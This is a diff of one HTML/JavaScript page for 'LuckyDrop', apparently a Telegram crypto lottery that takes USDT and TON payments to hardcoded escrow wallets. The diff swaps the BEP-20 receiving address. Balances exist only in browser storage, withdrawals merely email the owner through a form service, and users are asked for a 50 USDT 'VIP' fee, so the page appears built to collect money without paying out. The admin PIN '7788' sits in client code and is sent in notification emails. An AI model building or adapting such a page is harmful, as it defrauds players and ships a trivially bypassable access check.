@@ -53,7 +53,7 @@
       overflow-x: hidden;
     }
 
-    /* 🔴 LIVE MARQUEE TICKER STRIP (CHALTI HUI PATI) */
+    /* 🔴 LIVE MARQUEE WINNING TICKER STRIP */
     .top-marquee-strip {
       background: linear-gradient(90deg, #0B1121 0%, #151D33 50%, #0B1121 100%);
       border-bottom: 1px solid var(--border-subtle);
@@ -65,7 +65,7 @@
     .marquee-track {
       display: inline-block;
       white-space: nowrap;
-      animation: tickerAnimation 30s linear infinite;
+      animation: tickerAnimation 32s linear infinite;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
     }
@@ -142,7 +142,6 @@
       position: relative;
     }
 
-    /* VIP BADGE BUTTON IN HEADER */
     .btn-vip-header {
       padding: 8px 12px;
       border-radius: 12px;
@@ -198,7 +197,6 @@
       gap: 6px;
     }
 
-    /* THREE DOTS MENU BUTTON */
     .btn-dots-menu {
       width: 38px;
       height: 38px;
@@ -263,11 +261,6 @@
       color: var(--gold-primary);
     }
     .dropdown-item.vip-item { color: #C084FC; }
-    .dropdown-item.admin-btn {
-      color: #F5C242;
-      background: rgba(245, 194, 66, 0.08);
-      border: 1px dashed rgba(245, 194, 66, 0.3);
-    }
     .dropdown-item.disconnect { color: #F87171; }
     .dropdown-item.disconnect:hover { background: rgba(239, 68, 68, 0.14); color: #EF4444; }
     .dropdown-divider { height: 1px; background: var(--border-subtle); margin: 4px 6px; }
@@ -328,7 +321,7 @@
       max-width: 520px;
     }
 
-    /* 💰 IN-APP BALANCE & DAILY CHECK-IN BAR */
+    /* IN-APP BALANCE & DAILY CHECK-IN BAR */
     .wallet-balance-card {
       background: rgba(15, 23, 42, 0.75);
       border: 1px solid var(--border-gold);
@@ -909,6 +902,20 @@
       font-size: 11px;
       color: var(--text-dim);
       font-family: 'JetBrains Mono', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+    .footer-admin-link {
+      color: rgba(255, 255, 255, 0.25);
+      cursor: pointer;
+      font-size: 10px;
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .footer-admin-link:hover {
+      color: var(--gold-primary);
     }
   </style>
 </head>
@@ -979,13 +986,7 @@
 
           <button type="button" class="dropdown-item" onclick="triggerMenuAction('copy-wallet')">
             <span>📋</span>
-            <span>Copy My Address</span>
-          </button>
-
-          <!-- 🛡️ OWNER ADMIN PANEL ENTRY -->
-          <button type="button" class="dropdown-item admin-btn" onclick="triggerMenuAction('admin-panel')">
-            <span>🛡️</span>
-            <span>Admin Approvals</span>
+            <span>Copy My Unique Address</span>
           </button>
 
           <div class="dropdown-divider"></div>
@@ -1009,7 +1010,7 @@
         </div>
         <h1>Test Your Luck with<br><span class="gold-gradient">Provably Fair 1$</span> Draws</h1>
         <p class="hero-desc">
-          Automated payment authorization with Tonkeeper, Telegram @wallet, Trust Wallet, or MetaMask. Claim daily rewards, enter draws, and track on-chain payouts.
+          Automated payment authorization with Tonkeeper, Telegram @wallet, Trust Wallet, or MetaMask. Connect your wallet to claim daily bonuses, enter weekly draws, and manage withdrawals.
         </p>
 
         <!-- 💰 IN-APP BALANCE & DAILY CHECK-IN BAR -->
@@ -1040,7 +1041,7 @@
           </div>
           <div class="matrix-card">
             <div class="m-title">Cycle Closes</div>
-            <div class="m-value" style="color: var(--emerald-accent); font-size: 16px;" id="cycleTimer">2d 14h 28m</div>
+            <div class="m-value" style="color: var(--emerald-accent); font-size: 15px;" id="cycleTimer">Calculating...</div>
           </div>
         </div>
 
@@ -1205,7 +1206,7 @@
               <span style="font-size: 11px; color: var(--gold-primary); font-family: 'JetBrains Mono', monospace;" id="verifiedBadge">0 Tickets</span>
             </div>
             <div id="verifiedTicketsList" style="font-size: 11px; color: var(--text-muted);">
-              No tickets found. Submit your payment Tx Hash to initiate verification.
+              No tickets found. Connect wallet and submit your payment Tx Hash to initiate verification.
             </div>
           </div>
 
@@ -1214,7 +1215,7 @@
     </div>
   </main>
 
-  <!-- 1. 💸 WITHDRAWAL MODAL (MIN. 10$ + DEDICATED FIELDS) -->
+  <!-- 1. 💸 WITHDRAWAL MODAL -->
   <div id="withdrawModal" class="modal-backdrop" onclick="withdrawModalClick(event)">
     <div class="dialog-box">
       <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
@@ -1270,7 +1271,7 @@
         <div style="font-size: 11px; color: #E9D5FF; font-family: 'JetBrains Mono', monospace;"><strong>Fee:</strong> 50.00 USDT (BEP-20)</div>
         <div style="font-size: 10px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; margin-top: 6px;">TRANSFER TO BEP-20 ESCROW:</div>
         <div style="font-size: 11px; color: #34D399; font-family: 'JetBrains Mono', monospace; word-break: break-all; margin-top: 2px;">
-          0x660877476587F0FaBb9000a81A6bE884289D6Bfe
+          0x399DaD74C97D389987474d0d874674C32af661D1
         </div>
         <button type="button" class="copy-btn" style="margin-top: 8px; border-color: #C084FC; color: #C084FC;" onclick="copyVipEscrow()">📋 Copy VIP Escrow</button>
       </div>
@@ -1332,17 +1333,17 @@
     </div>
   </div>
 
-  <!-- 4. 🛡️ ADMIN VERIFICATION & APPROVAL MODAL -->
+  <!-- 4. 🛡️ SECRET PASSWORD-PROTECTED ADMIN PORTAL -->
   <div id="adminModal" class="modal-backdrop" onclick="adminModalClick(event)">
     <div class="dialog-box">
       <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-        <h3 style="font-family: 'Space Grotesk', sans-serif; font-size: 18px; font-weight: 800; color: var(--gold-primary);">🛡️ Admin Approvals Panel</h3>
+        <h3 style="font-family: 'Space Grotesk', sans-serif; font-size: 18px; font-weight: 800; color: var(--gold-primary);">🛡️ Secure Admin Portal</h3>
         <button type="button" onclick="closeAdminModal()" style="background: none; border: none; color: var(--text-dim); font-size: 20px; cursor: pointer;">✕</button>
       </div>
 
       <div id="adminAuthSection">
-        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;">Enter Owner Security PIN to access approvals:</p>
-        <input type="password" id="adminPinInput" class="form-input" style="text-align: center; font-size: 18px; letter-spacing: 4px; margin-bottom: 10px;" placeholder="****" maxlength="4" />
+        <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;">Enter Owner Security Passcode to access approvals:</p>
+        <input type="password" id="adminPinInput" class="form-input" style="text-align: center; font-size: 20px; letter-spacing: 5px; margin-bottom: 12px;" placeholder="••••" maxlength="10" />
         <button type="button" class="btn-submit-action" onclick="authenticateAdmin()">Unlock Admin Hub</button>
       </div>
 
@@ -1359,15 +1360,18 @@
   </div>
 
   <footer>
-    LuckyDrop Protocol © 2026 • Automated Web3 Settlement • Anti-Fraud Protection
+    <div>LuckyDrop Protocol © 2026 • Automated Web3 Settlement • Anti-Fraud Protection</div>
+    <a class="footer-admin-link" onclick="openAdminModal()">🛡️ Admin Portal</a>
   </footer>
 
   <script>
     var ADMIN_NOTIFICATION_EMAIL = "easicarts@gmail.com";
-    var ADMIN_PIN = "7788";
+    var ADMIN_PIN = "7788"; // Secret owner passcode
 
     var MY_TON_ESCROW = "EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N";
-    var MY_BEP20_ESCROW = "0x660877476587F0FaBb9000a81A6bE884289D6Bfe";
+    // 🌟 UPDATED BEP-20 RECEIVING ESCROW WALLET ADDRESS
+    var MY_BEP20_ESCROW = "0x399DaD74C97D389987474d0d874674C32af661D1";
+
     var TELEGRAM_APP_BASE_URL = "http://t.me/Luckydrop_miniusdt_bot/Draw";
 
     var activeNetwork = "TON";
@@ -1387,19 +1391,75 @@
     }
 
     /* ====================================================================
-       IN-APP BALANCES & DAILY CHECK-IN (+0.01$)
+       ⏳ REAL-TIME LIVE TICKING DRAW COUNTDOWN TIMER
+       ==================================================================== */
+    function startLiveCountdown() {
+      function getNextDrawDate() {
+        var now = new Date();
+        var target = new Date();
+        var dayOfWeek = now.getUTCDay();
+        var daysUntilSunday = (7 - dayOfWeek) % 7;
+        
+        target.setUTCDate(now.getUTCDate() + daysUntilSunday);
+        target.setUTCHours(23, 59, 59, 0);
+
+        if (target.getTime() <= now.getTime()) {
+          target.setUTCDate(target.getUTCDate() + 7);
+        }
+        return target.getTime();
+      }
+
+      var targetTime = getNextDrawDate();
+
+      function updateClock() {
+        var now = new Date().getTime();
+        var diff = targetTime - now;
+
+        if (diff <= 0) {
+          targetTime = getNextDrawDate();
+          diff = targetTime - now;
+        }
+
+        var days = Math.floor(diff / (1000 * 60 * 60 * 24));
+        var hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        var seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+        var timerEl = document.getElementById('cycleTimer');
+        if (timerEl) {
+          timerEl.innerText = days + "d " + 
+            (hours < 10 ? "0" + hours : hours) + "h " + 
+            (minutes < 10 ? "0" + minutes : minutes) + "m " + 
+            (seconds < 10 ? "0" + seconds : seconds) + "s";
+        }
+      }
+
+      updateClock();
+      setInterval(updateClock, 1000);
+    }
+
+    /* ====================================================================
+       IN-APP BALANCES & STRICT WALLET-GATED DAILY CHECK-IN (+0.01$)
        ==================================================================== */
     function loadInAppBalances() {
-      var savedUsdt = localStorage.getItem('ld_inapp_usdt');
-      var savedTon = localStorage.getItem('ld_inapp_ton');
+      if (!userConnectedWallet) {
+        document.getElementById('inAppUsdtVal').innerText = "0.00";
+        document.getElementById('inAppTonVal').innerText = "0.00";
+        var btn = document.getElementById('dailyCheckInBtn');
+        btn.classList.remove('claimed');
+        btn.innerText = "🎁 Check-in (+0.01$)";
+        return;
+      }
+
+      var savedUsdt = localStorage.getItem('ld_inapp_usdt_' + userConnectedWallet);
+      var savedTon = localStorage.getItem('ld_inapp_ton_' + userConnectedWallet);
       userInAppUsdt = savedUsdt ? parseFloat(savedUsdt) : 0.00;
       userInAppTon = savedTon ? parseFloat(savedTon) : 0.00;
 
       document.getElementById('inAppUsdtVal').innerText = userInAppUsdt.toFixed(2);
       document.getElementById('inAppTonVal').innerText = userInAppTon.toFixed(2);
 
-      // Check daily status
-      var lastClaim = localStorage.getItem('ld_last_daily_claim');
+      var lastClaim = localStorage.getItem('ld_last_claim_' + userConnectedWallet);
       var today = new Date().toDateString();
       var btn = document.getElementById('dailyCheckInBtn');
       if (lastClaim === today) {
@@ -1410,7 +1470,6 @@
         btn.innerText = "🎁 Check-in (+0.01$)";
       }
 
-      // Check VIP status
       isUserVip = localStorage.getItem('ld_is_vip_' + userConnectedWallet) === 'true';
       var vipBadge = document.getElementById('headerVipBadge');
       if (isUserVip && vipBadge) {
@@ -1421,16 +1480,22 @@
     }
 
     function handleDailyCheckIn() {
+      if (!userConnectedWallet) {
+        showToast("⚠️ Please connect your wallet first to claim daily bonus!", "error");
+        openWalletModal();
+        return;
+      }
+
       var today = new Date().toDateString();
-      var lastClaim = localStorage.getItem('ld_last_daily_claim');
+      var lastClaim = localStorage.getItem('ld_last_claim_' + userConnectedWallet);
       if (lastClaim === today) {
         showToast("ℹ️ You have already checked in today! Come back tomorrow.", "info");
         return;
       }
 
       userInAppUsdt += 0.01;
-      localStorage.setItem('ld_inapp_usdt', userInAppUsdt.toString());
-      localStorage.setItem('ld_last_daily_claim', today);
+      localStorage.setItem('ld_inapp_usdt_' + userConnectedWallet, userInAppUsdt.toString());
+      localStorage.setItem('ld_last_claim_' + userConnectedWallet, today);
 
       document.getElementById('inAppUsdtVal').innerText = userInAppUsdt.toFixed(2);
       var btn = document.getElementById('dailyCheckInBtn');
@@ -1483,15 +1548,13 @@
         shareOnTelegram();
       } else if (action === 'copy-wallet') {
         if (!userConnectedWallet) {
-          showToast("ℹ️ No wallet connected yet. Connect wallet first.", "info");
+          showToast("⚠️ Please connect your wallet first to view & copy your unique address.", "error");
           openWalletModal();
           return;
         }
         navigator.clipboard.writeText(userConnectedWallet).then(function() {
           showToast("✅ Connected Wallet Address Copied!", "success");
         });
-      } else if (action === 'admin-panel') {
-        openAdminModal();
       } else if (action === 'disconnect') {
         disconnectWallet();
       }
@@ -1502,7 +1565,7 @@
        ==================================================================== */
     function openWithdrawModal() {
       if (!userConnectedWallet) {
-        showToast("ℹ️ Please connect your wallet first to withdraw.", "info");
+        showToast("⚠️ Please connect your wallet first to withdraw.", "error");
         openWalletModal();
         return;
       }
@@ -1532,14 +1595,10 @@
       }
 
       closeWithdrawModal();
-
-      // Clear input
       document.getElementById('withdrawAmountInput').value = "";
 
-      // Notice to user: "Withdrawal submitted"
       showToast("✅ Withdrawal submitted! Your request of " + amount.toFixed(2) + " USDT is under review.", "success");
 
-      // Notify Owner Email
       try {
         fetch("https://formspree.io/f/mqaeerqo", {
           method: "POST",
@@ -1606,7 +1665,6 @@
 
       showToast("⏳ VIP Request Submitted! Awaiting Admin Activation.", "info");
 
-      // Email notification for VIP
       try {
         fetch("https://formspree.io/f/mqaeerqo", {
           method: "POST",
@@ -1617,32 +1675,33 @@
             message: "👑 VIP 50$ ACTIVATION SUBMITTED 👑\n\n" +
                      "Buyer Wallet: " + userConnectedWallet + "\n" +
                      "Amount: 50 USDT (BEP-20)\n" +
+                     "Escrow Address: " + MY_BEP20_ESCROW + "\n" +
                      "Tx Hash: " + txHash + "\n" +
                      "Explorer Link: https://bscscan.com/tx/" + txHash + "\n\n" +
-                     "Admin Hub: Open app -> (⋮) -> 'Admin Approvals' -> PIN: " + ADMIN_PIN + "\n" +
+                     "Admin Hub: Open app -> Footer 'Admin Portal' -> PIN: " + ADMIN_PIN + "\n" +
                      "Timestamp: " + new Date().toLocaleString()
           })
         }).catch(function(){});
       } catch(e) {}
     }
 
-    /* REFERRAL LINK CREATION */
+    /* REFERRAL LINK CREATION (STRICT WALLET-GATED) */
     function getTelegramReferralLink() {
       var refCode = "ref_MEMBER";
       if (userConnectedWallet) {
         refCode = "ref_" + userConnectedWallet.substring(2, 8).toUpperCase();
       } else {
-        var cached = localStorage.getItem('ld_guest_ref');
-        if (!cached) {
-          cached = "ref_" + Math.random().toString(36).substring(2, 8).toUpperCase();
-          localStorage.setItem('ld_guest_ref', cached);
-        }
-        refCode = cached;
+        return null;
       }
       return TELEGRAM_APP_BASE_URL + "?startapp=" + refCode;
     }
 
     function copyReferralLink() {
+      if (!userConnectedWallet) {
+        showToast("⚠️ Please connect your wallet first to generate your unique referral link!", "error");
+        openWalletModal();
+        return;
+      }
       var link = getTelegramReferralLink();
       navigator.clipboard.writeText(link).then(function() {
         showToast("✅ Telegram Referral Link Copied!\n" + link, "success");
@@ -1652,6 +1711,11 @@
     }
 
     function shareOnTelegram() {
+      if (!userConnectedWallet) {
+        showToast("⚠️ Please connect your wallet first to share your referral link!", "error");
+        openWalletModal();
+        return;
+      }
       var link = getTelegramReferralLink();
       var text = encodeURIComponent("🎁 Enter LuckyDrop Weekly 1$ USDT Draws on Telegram! Provably fair on-chain payouts:\n" + link);
       var shareUrl = "https://t.me/share/url?url=" + encodeURIComponent(link) + "&text=" + text;
@@ -1704,10 +1768,13 @@
     }
 
     /* ====================================================================
-       🛡️ ADMIN MODAL & APPROVAL LOGIC
+       🛡️ SECURE ADMIN MODAL & APPROVAL LOGIC (PIN PROTECTED)
        ==================================================================== */
     function openAdminModal() {
       document.getElementById('adminModal').style.display = 'flex';
+      document.getElementById('adminAuthSection').style.display = 'block';
+      document.getElementById('adminDashboardSection').style.display = 'none';
+      document.getElementById('adminPinInput').value = "";
     }
     function closeAdminModal() {
       document.getElementById('adminModal').style.display = 'none';
@@ -1723,7 +1790,8 @@
         document.getElementById('adminDashboardSection').style.display = 'block';
         renderAdminSubmissions();
       } else {
-        showToast("❌ Incorrect Admin PIN!", "error");
+        showToast("❌ Incorrect Admin Passcode!", "error");
+        document.getElementById('adminPinInput').value = "";
       }
     }
 
@@ -1911,8 +1979,8 @@
 
     function saveVerifiedWallet(addr, providerName) {
       userConnectedWallet = addr;
-      localStorage.setItem('ld_verified_wallet', userConnectedWallet);
-      localStorage.setItem('ld_provider_name', providerName);
+      sessionStorage.setItem('ld_session_wallet', userConnectedWallet);
+      sessionStorage.setItem('ld_session_provider', providerName);
       closeWalletModal();
       applyConnectedState();
       loadInAppBalances();
@@ -1931,12 +1999,15 @@
     function disconnectWallet() {
       userConnectedWallet = null;
       connectedProvider = null;
+      sessionStorage.removeItem('ld_session_wallet');
+      sessionStorage.removeItem('ld_session_provider');
       localStorage.removeItem('ld_verified_wallet');
-      localStorage.removeItem('ld_provider_name');
       document.getElementById('btnConnectHeader').style.display = 'flex';
       document.getElementById('connectedPill').style.display = 'none';
       var input = document.getElementById('manualWalletInput');
       if (input) input.value = "";
+      loadInAppBalances();
+      renderTicketsList([]);
       showToast("Wallet Disconnected successfully.", "info");
     }
 
@@ -2147,7 +2218,7 @@
                      "Receiving Escrow: " + targetEscrow + "\n" +
                      "Tx Hash: " + txHash + "\n\n" +
                      "🔍 VERIFY ON BLOCKCHAIN EXPLORER:\n" + explorerUrl + "\n\n" +
-                     "Admin Hub: Open app -> Click (⋮) -> 'Admin Approvals' -> PIN: " + ADMIN_PIN + "\n" +
+                     "Admin Hub: Open app -> Footer 'Admin Portal' -> PIN: " + ADMIN_PIN + "\n" +
                      "Timestamp: " + new Date().toLocaleString()
           })
         }).catch(function(){});
@@ -2177,7 +2248,7 @@
       badge.innerText = verifiedCount + " Active / " + pendingCount + " Pending";
 
       if (tickets.length === 0) {
-        list.innerHTML = "No tickets found. Submit your payment Tx Hash to initiate verification.";
+        list.innerHTML = "No tickets found. Connect wallet and submit your payment Tx Hash to initiate verification.";
       } else {
         var html = '<div style="margin-top: 6px;">';
         for (var j = 0; j < tickets.length; j++) {
@@ -2216,14 +2287,20 @@
     }
 
     (function init() {
-      var saved = localStorage.getItem('ld_verified_wallet');
-      if (saved) {
-        userConnectedWallet = saved;
-        connectedProvider = localStorage.getItem('ld_provider_name') || "Connected";
+      var activeSessionWallet = sessionStorage.getItem('ld_session_wallet');
+      if (activeSessionWallet) {
+        userConnectedWallet = activeSessionWallet;
+        connectedProvider = sessionStorage.getItem('ld_session_provider') || "Connected";
         applyConnectedState();
+      } else {
+        userConnectedWallet = null;
+        document.getElementById('btnConnectHeader').style.display = 'flex';
+        document.getElementById('connectedPill').style.display = 'none';
       }
+
       loadInAppBalances();
       updateUI();
+      startLiveCountdown();
     })();
   </script>
 </body>
